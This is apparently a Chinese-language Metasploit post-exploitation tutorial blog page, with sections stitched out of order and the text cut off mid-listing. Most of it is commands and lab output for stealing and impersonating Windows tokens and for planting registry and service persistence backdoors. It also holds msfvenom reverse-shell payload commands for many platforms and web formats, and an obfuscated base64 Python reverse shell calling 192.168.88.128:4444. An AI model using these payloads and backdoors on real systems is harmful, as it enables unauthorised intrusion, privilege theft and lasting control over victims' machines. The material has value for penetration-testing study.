<h3 id="4-7-假冒令牌-1"><a href="#4-7-假冒令牌-1" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-1"><a href="#4-8-植入后门-1" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-2"><a href="#2-msf基本命令-2" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-2"><a href="#3-msfvenom生成payload-2" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-2"><a href="#4-Meterpreter基本命令-2" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-2"><a href="#4-1-基本系统命令-2" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 